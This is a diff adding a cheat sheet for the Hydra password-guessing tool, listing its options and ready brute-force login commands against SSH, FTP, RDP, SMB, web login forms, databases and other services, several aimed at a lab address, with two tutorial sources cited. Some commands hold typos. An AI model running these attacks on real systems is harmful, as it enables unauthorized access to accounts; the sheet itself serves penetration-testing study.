@@ -1,0 +1,57 @@
+Common Options
+-L : Username list file
+-l : Single username
+-P : Password list file
+-p : Single password
+-s : Specify port
+-t : Number of parallel connections (default: 16)
+-v : Verbose mode (use -vv for more verbose)
+-V : Show login+password combination for each attempt
+-f : Exit after the first found login/password pair
+-e : Additional checks (s, n, r)
+s : Check for empty password
+n : Check for null password (Hashcat Cheat Sheet: Mastering Password Cracking)
+r : Check for reverse login (login as password)
+
+Advanced Options
+-o : Output file for results
+-u : Loop around users, not passwords (effective for large username lists)
+-m : Module options
+-T : Taskset affinity
+
+
+FTP : hydra -l username -P passwords.txt ftp://target_ip
+SSH : hydra -L usernames.txt -P passwords.txt ssh://target_ip
+HTTP : hydra -L usernames.txt -P passwords.txt target_ip http-get-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+SMTP : hydra -L usernames.txt -P passwords.txt smtp://target_ip
+RDP : hydra -L usernames.txt -P passwords.txt rdp://target_ip
+SSH : hydra -L usernames.txt -P passwords.txt -s 22 -vV -o results.txt ssh://target_ip
+
+
+RDP : hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
+SSH : hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V
+SMB : hydra -l root -P passwords.txt -f smb://10.0.2.5 -V
+HTTP GET : hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V
+BruteForce : hydra -L users.txt -P password.txt 10.0.2.5 http-post-form"/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Loginname or password is incorrect" -V
+IMAP : hydra -l root -P passwords.txt -f imap://10.0.2.5 -V
+MqSQL : hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V
+Pop3 : hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V
+Redis : hydra–P password.txt redis://10.0.2.5 -V
+Rexec : hydra -l root -P password.txt rexec://10.0.2.5 -V
+Rlogin : hydra -l root -P password.txt rlogin://10.0.2.5 -V
+Rsh : hydra -L username.txt rsh://10.0.2.5 -V
+rtsp : hydra -l root -P passwords.txt <IP> rtsp
+Smtp : hydra -l <username> -P passwords.txt <IP> smtp -V
+telnet : hydra -l root -P passwords.txt [-t 32] <IP> telnet
+vnc : hydra -L user.txt –P pass.txt -s <PORT><IP> vnc
+
+
+Source : https://denizhalil.com/2024/07/10/hydra-password-cracking-tool/
+Source : https://www.stationx.net/how-to-use-hydra/
+
+
+
+
+
+
+
